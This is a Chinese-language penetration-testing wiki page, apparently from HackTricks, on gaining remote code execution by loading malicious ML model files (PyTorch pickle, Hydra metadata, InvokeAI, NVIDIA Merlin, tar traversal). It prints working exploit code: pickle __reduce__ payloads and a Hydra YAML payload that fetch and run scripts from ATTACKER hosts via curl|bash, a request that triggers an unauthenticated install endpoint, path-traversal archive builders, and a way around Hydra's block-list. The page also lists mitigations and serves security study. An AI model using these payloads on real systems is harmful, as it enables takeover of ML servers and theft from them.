# 模型 RCE

{{#include ../banners/hacktricks-training.md}}

## 将模型加载以触发 RCE

机器学习模型通常以多种格式共享，例如 ONNX、TensorFlow、PyTorch 等。这些模型可以被加载到开发者的机器或生产系统中以供使用。通常模型不应包含恶意代码，但在某些情况下，模型可能被用于在系统上执行任意代码，作为预期功能或由于模型加载库中的漏洞。

在撰写本文时，以下是此类漏洞的一些示例：

| **框架 / 工具**        | **漏洞（如有则列出 CVE）**                                                    | **RCE 利用向量**                                                                                                                           | **参考**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *在* `torch.load` *中不安全的反序列化* **(CVE-2025-32434)**                                                              | 模型检查点中的恶意 pickle 导致代码执行（绕过 `weights_only` 保护）                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + 恶意模型下载导致代码执行；管理 API 中的 Java 反序列化 RCE                                        | |
| **NVIDIA Merlin Transformers4Rec** | 通过 `torch.load` 的不安全检查点反序列化 **(CVE-2025-23298)**                                           | 不受信任的检查点在 `load_model_trainer_states_from_checkpoint` 期间触发 pickle reducer → 在 ML worker 中执行代码            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678**（不安全的 YAML） <br> **CVE-2024-3660**（Keras Lambda）                                                      | 从 YAML 加载模型使用 `yaml.unsafe_load`（代码执行） <br> 加载带有 **Lambda** 层的模型会运行任意 Python 代码          | |
| TensorFlow (TFLite)         | **CVE-2022-23559**（TFLite 解析）                                                                                          | 特制的 `.tflite` 模型触发整数溢出 → 堆损坏（潜在 RCE）                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092**（joblib/pickle）                                                                                           | 通过 `joblib.load` 加载模型会执行带有攻击者 `__reduce__` 有效载荷的 pickle                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446**（不安全的 `np.load`）*有争议*                                                                              | `numpy.load` 默认允许被 pickle 的对象数组——恶意 `.npy/.npz` 触发代码执行                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882**（目录遍历） <br> **CVE-2024-5187**（tar 遍历）                                                    | ONNX 模型的 external-weights 路径可以逃出目录（读取任意文件） <br> 恶意 ONNX 模型 tar 可以覆盖任意文件（导致 RCE） | |
| ONNX Runtime (design risk)  | *(无 CVE)* ONNX 自定义 ops / 控制流                                                                                    | 带自定义操作的模型可能需要加载攻击者的本地代码；复杂的模型图可以滥用逻辑来执行未预期的计算   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036**（路径遍历）                                                                                          | 在启用 `--model-control` 的情况下使用 model-load API 允许相对路径遍历以写入文件（例如覆盖 `.bashrc` 导致 RCE）    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668**（多个堆溢出）                                                                         | 格式不良的 GGUF 模型文件导致解析器中的堆缓冲区溢出，从而可以在受害系统上执行任意代码                     | |
| **Keras (older formats)**   | *(无新 CVE)* 旧版 Keras H5 模型                                                                                         | 带有 Lambda 层代码的恶意 HDF5 (`.h5`) 模型在加载时仍会执行（Keras safe_mode 不涵盖旧格式——“降级攻击”） | |
| **Others** (general)        | *设计缺陷* – Pickle serialization                                                                                         | 许多 ML 工具（例如基于 pickle 的模型格式、Python 的 `pickle.load`）会执行嵌入在模型文件中的任意代码，除非进行缓解 | |
| **NeMo / uni2TS / FlexTok (Hydra)** | 不受信任的元数据传递给 `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | 攻击者控制的模型元数据/配置将 `_target_` 设置为任意可调用对象（例如 `builtins.exec`）→ 在加载期间执行，即使是“安全”格式（`.safetensors`、`.nemo`、repo 的 `config.json`）也会受影响 | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

此外，还有一些基于 python pickle 的模型，例如 [PyTorch](https://github.com/pytorch/pytorch/security) 使用的模型，如果在加载时未设置 `weights_only=True`，可能被用来在系统上执行任意代码。因此，任何基于 pickle 的模型都可能特别容易受到这类攻击，即使它们未列在上表中。

### Hydra 元数据 → RCE（即使使用 safetensors 也有效）

`hydra.utils.instantiate()` 会导入并调用配置/元数据对象中任何带点的 `_target_`。当库将 **不受信任的模型元数据** 传入 `instantiate()` 时，攻击者可以提供一个可调用对象及其参数，这些会在模型加载期间立即运行（不需要 pickle）。

有效载荷示例（适用于 `.nemo` 的 `model_config.yaml`、repo 的 `config.json`，或 `.safetensors` 内的 `__metadata__`）：
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
要点:
- 在 NeMo `restore_from/from_pretrained`、uni2TS HuggingFace coders 和 FlexTok loaders 中，于模型初始化之前触发。
- Hydra 的字符串阻止列表（string block-list）可以通过替代导入路径绕过（例如 `enum.bltns.eval`），或通过应用解析的名称绕过（例如 `nemo.core.classes.common.os.system` → `posix`）。
- FlexTok 还使用 `ast.literal_eval` 解析字符串化的元数据，从而在调用 Hydra 之前触发 DoS（CPU/内存暴涨）。

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` 是一个流行的开源 Stable-Diffusion web 界面。版本 **5.3.1 – 5.4.2** 暴露了 REST 端点 `/api/v2/models/install`，允许用户从任意 URL 下载并加载模型。

内部该端点最终调用：
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
当所提供的文件是一个 **PyTorch checkpoint (`*.ckpt`)** 时，`torch.load` 会执行 **pickle deserialization**。由于内容直接来自用户控制的 URL，攻击者可以在 checkpoint 中嵌入一个带有自定义 `__reduce__` 方法的恶意对象；该方法会在 **反序列化期间** 执行，从而导致 InvokeAI 服务器上的 **remote code execution (RCE)**。

该漏洞被分配为 **CVE-2024-12029**（CVSS 9.8，EPSS 61.17 %）。

#### 利用演练

1. 创建一个恶意 checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. 在你控制的 HTTP 服务器上托管 `payload.ckpt`（例如 `http://ATTACKER/payload.ckpt`）。
3. 触发易受攻击的端点（无需身份验证）：
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. 当 InvokeAI 下载该文件时，它会调用 `torch.load()` → `os.system` gadget 运行，攻击者在 InvokeAI 进程的上下文中获得代码执行权限。

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` 自动化整个流程。

#### Conditions

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)  
•  `/api/v2/models/install` 可被攻击者访问  
•  进程具有执行 shell 命令的权限

#### Mitigations

* Upgrade to **InvokeAI ≥ 5.4.3** – 补丁将 `scan=True` 设为默认，并在反序列化前执行恶意软件扫描。  
* When loading checkpoints programmatically use `torch.load(file, weights_only=True)` or the new [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper.  
* 强制为 model sources 实施 allow-lists / 签名，并以最小权限运行该服务。

> ⚠️ 记住 **任何** 基于 Python pickle 的格式（包括许多 `.pt`, `.pkl`, `.ckpt`, `.pth` 文件）从不受信任的来源反序列化本质上是不安全的。

---

Example of an ad-hoc mitigation if you must keep older InvokeAI versions running behind a reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE 通过不安全的 `torch.load` (CVE-2025-23298)

NVIDIA 的 Transformers4Rec（属于 Merlin）暴露了一个不安全的 checkpoint loader，会在用户提供的路径上直接调用 `torch.load()`。由于 `torch.load` 依赖 Python 的 `pickle`，攻击者控制的 checkpoint 可以在反序列化过程中通过 reducer 执行任意代码。

Vulnerable path (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Why this leads to RCE: 在 Python 的 pickle 中，对象可以定义一个 reducer（`__reduce__`/`__setstate__`），它返回一个 callable 和参数。该 callable 在反序列化时被执行。如果这样的对象出现在 checkpoint 中，它会在任何权重被使用之前运行。

Minimal malicious checkpoint example:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
传播载体和影响范围：
- Trojanized checkpoints/models 通过 repos、buckets 或 artifact registries 共享
- 自动化的 resume/deploy pipelines 会自动加载 checkpoints
- 执行发生在 training/inference workers 内，通常具有提升的权限（例如容器中的 root）

修复：Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) 用在 `transformers4rec/utils/serialization.py` 中实现的受限、allow-listed deserializer 替换了直接的 `torch.load()`。新的 loader 验证类型/字段并防止在加载期间调用任意可调用对象。

针对 PyTorch checkpoints 的防御性指导：
- 不要 unpickle 不受信任的数据。尽量使用非可执行格式，例如 [Safetensors](https://huggingface.co/docs/safetensors/index) 或 ONNX。
- 如果必须使用 PyTorch 序列化，确保 `weights_only=True`（在较新的 PyTorch 中受支持），或使用类似 Transformers4Rec 补丁的自定义 allow-listed unpickler。
- 强制模型溯源/签名并对反序列化进行沙箱限制（seccomp/AppArmor；非 root 用户；受限 FS 并无网络外联）。
- 在 checkpoint 加载时监控来自 ML 服务的意外子进程；追踪 `torch.load()`/`pickle` 的使用。

POC 和 漏洞/补丁 参考：
- 补丁前的易受攻击 loader： https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- 恶意 checkpoint POC： https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- 补丁后的 loader： https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Example – crafting a malicious PyTorch model

- Create the model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- 加载模型：
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

腾讯的 FaceDetection-DSFD 暴露了一个 `resnet` endpoint，deserializes user-controlled data。ZDI 确认，远程攻击者可以诱使受害者加载恶意页面/文件，使其向该 endpoint 推送精心构造的 serialized blob，并以 `root` 身份触发 deserialization，导致完全妥协。

利用流程与典型的 pickle abuse 相似：
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
任何在反序列化期间可达的 gadget（构造函数、`__setstate__`、框架回调等）都可以以相同方式被武器化，无论传输载体是 HTTP、WebSocket，还是被放入受监视目录的文件。

## 模型引发的路径遍历

正如 [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) 所述，不同 AI 框架使用的大多数模型格式基于归档文件，通常是 `.zip`。因此，可能滥用这些格式执行路径遍历攻击，从而读取模型被加载的系统上的任意文件。

例如，使用下面的代码可以创建一个模型，在加载时会在 `/tmp` 目录创建一个文件：
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
或者，使用下面的代码，你可以创建一个模型，在加载时会创建一个 symlink 指向 `/tmp` 目录：
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### 深入探讨：Keras .keras deserialization and gadget hunting

有关 .keras 内部机制、Lambda-layer RCE、在 ≤ 3.8 中的 arbitrary import issue，以及修复后在 allowlist 内进行 post-fix gadget discovery 的专题指南，请参见：

{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## 参考资料

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [Unit 42 – Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)

{{#include ../banners/hacktricks-training.md}}
